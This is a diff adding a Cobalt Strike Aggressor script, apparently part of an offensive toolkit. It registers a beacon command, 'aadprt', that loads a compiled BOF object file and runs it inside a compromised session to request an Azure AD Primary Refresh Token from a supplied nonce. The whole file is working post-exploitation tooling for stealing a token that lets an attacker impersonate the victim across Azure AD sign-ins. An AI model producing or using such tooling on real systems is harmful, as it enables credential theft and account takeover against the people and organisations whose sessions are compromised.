@@ -1,0 +1,38 @@
+alias aadprt {
+    local('$barch $handle $data $args');
+    
+    if( size(@_) < 2)
+    {
+        berror($1, "Missing nonce");
+        berror($1, beacon_command_detail("aadprt"));
+        return;
+    }
+    
+    # figure out the arch of this session
+    $barch  = barch($1);
+
+    # read in the right BOF file
+    $handle = openf(script_resource("bin/aadprt. $+ $barch $+ .o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    if(strlen($data) == 0)
+    {
+        berror($1, "could not read bof file");
+    }
+
+	# pack our arguments
+    $args = bof_pack($1, "Z", $2);
+
+   	# announce what we're doing
+    btask($1, "Requesting an Azure AD PRT", "T1098.001");
+
+	# execute it.
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+beacon_command_register(
+    "aadprt",
+    "Request an Azure AD PRT given the provided nonce",
+    "aadprt <nonce>"
+);
